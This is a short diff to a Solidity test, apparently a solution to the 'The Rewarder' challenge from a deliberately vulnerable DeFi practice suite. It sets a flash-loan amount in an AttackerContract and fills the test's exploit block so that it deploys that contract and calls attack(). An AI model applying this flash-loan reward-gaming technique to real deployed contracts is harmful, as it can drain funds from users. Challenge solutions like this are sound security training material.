@@ -15,7 +15,7 @@ import {FlashLoanerPool} from "../../../Contracts/the-rewarder/FlashLoanerPool.s
 contract AttackerContract {
     address public owner;
     FlashLoanerPool public flashLoanerPool;
-    uint256 TOTAL_AMOUNT_TO_FLASHLOAN = dvt.balanceOf(theRewarderPool) * 2;
+    uint256 TOTAL_AMOUNT_TO_FLASHLOAN = 1_000_000e18 - 1;
 
     constructor(address pool) {
         owner = msg.sender;
@@ -119,6 +119,10 @@ contract TheRewarder is DSTest {
     function testRewarderExploit() public {
         /** EXPLOIT START **/
         vm.startPrank(attacker);
+        AttackerContract attackerContract = new AttackerContract(
+            flashLoanerPool
+        );
+        attackerContract.attack();
 
         vm.stopPrank();
         /** EXPLOIT END **/
